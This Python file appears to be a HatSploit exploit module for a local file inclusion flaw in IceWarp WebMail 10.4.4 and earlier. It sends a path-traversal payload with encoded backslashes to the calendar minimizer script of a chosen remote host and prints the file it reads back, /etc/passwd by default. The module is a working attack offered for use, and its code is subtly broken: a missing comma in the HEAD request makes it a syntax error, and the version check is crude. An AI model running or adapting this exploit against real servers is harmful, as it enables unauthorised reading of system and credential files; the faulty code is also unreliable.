#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.badges import badges
from core.parser import parser

from utils.web_tools import web_tools

class HatSploitModule:
    def __init__(self):
        self.badges = badges()
        self.parser = parser()
        
        self.web_tools = web_tools()
        
        self.details = {
            'Name': "exploit/multi/icewarp_webmail/local_file_inclusion",
            'Authors': [
                'enty8080'
            ],
            'Description': "Local File Inclusion in IceWarp <= 10.4.4 WebMail.",
            'Dependencies': [
                ''
            ],
            'Comments': [
                ''
            ],
            'Risk': "high"
        }
        
        self.options = {
            'RHOST': {
                'Description': "Remote host.",
                'Value': None,
                'Required': True
            },
            'RPORT': {
                'Description': "Remote port.",
                'Value': 80,
                'Required': True
            },
            'RFILE': {
                'Description': "Remote file to read.",
                'Value': "/etc/passwd",
                'Required': True
            }
        }
        
    def read_remote_file(self, remote_host, remote_port, remote_file):
        target_url = self.web_tools.craft_url(remote_host, remote_port)
        
        self.badges.output_process("Generating payload...")
        payload = f"/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{remote_file.replace('/', '%5c')}"
        
        self.badges.output_process("Sending payload...")
        response = self.web_tools.http_request(
            method="GET",
            url=target_url,
            path=payload
        )
        
        if response.status_code != 200:
            self.badges.output_error("Failed to send payload!")
            return
        
        self.badges.output_process("Attempting to read file...")
        remote_file_output = response.text.strip()
        
        if remote_file_output:
            self.badges.output_information("Remote file output:")
            self.badges.output_empty(remote_file_output)
        else:
            self.badges.output_warning("File is empty.")
        
    def check_vulnerable(self, remote_host, remote_port):
        target_url = self.web_tools.craft_url(remote_host, remote_port)
        
        if self.web_tools.check_url_access(target_url):
            headers = self.web_tools.http_request(
                method="HEAD"
                url=target_url,
                path="/"
            ).headers
            
            if 'Server' in headers.keys():
                banner = headers['Server']
                if banner:
                    if int(banner.split('/')[1].split('.')[-1]) < 4:
                        return True
        return False
        
    def run(self):
        remote_host, remote_port, remote_file = self.parser.parse_options(self.options)
        
        target = self.web_tools.format_host_and_port(remote_host, remote_port)
        self.badges.output_process("Exploiting " + target + "...")

        if not self.check_vulnerable(remote_host, remote_port):
            self.badges.output_error("Exploit failed!")
            return
        
        self.read_remote_file(remote_host, remote_port, remote_file)
